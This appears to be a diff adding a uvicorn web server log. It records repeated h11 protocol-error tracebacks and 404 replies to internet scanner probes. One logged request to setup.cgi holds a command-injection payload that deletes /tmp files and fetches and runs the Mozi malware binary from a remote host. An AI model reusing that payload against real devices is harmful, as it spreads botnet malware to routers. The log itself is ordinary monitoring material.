+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:36240 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     209.141.45.200:40344 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:42050 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:33758 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:41326 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     209.17.97.10:53145 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:34996 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:43886 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:43544 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     180.149.125.162:9083 - "GET /c/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:38628 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:56032 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:53236 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:52342 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+INFO:     46.101.40.190:61001 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:48968 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:53824 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:52160 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:39864 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:54386 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:46824 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     180.149.125.162:29457 - "GET / HTTP/1.1" 404 Not Found
+INFO:     104.152.52.30:53133 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:57120 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     192.241.218.115:33350 - "GET /actuator/health HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:50874 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:42658 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     115.61.165.96:56811 - "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 Not Found
+INFO:     209.141.54.113:33130 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     192.241.216.162:34480 - "GET /hudson HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:43772 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     178.175.2.85:36298 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.2.85:50392/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:55818 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:60122 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     139.162.145.250:49892 - "GET /bag2 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:36848 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:41242 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     192.64.5.1:52418 - "GET http%3A//www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:34226 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:55520 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     216.218.206.66:43800 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:37076 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.38:48308 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.37:49622 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.37:36948 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:38096 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [347]
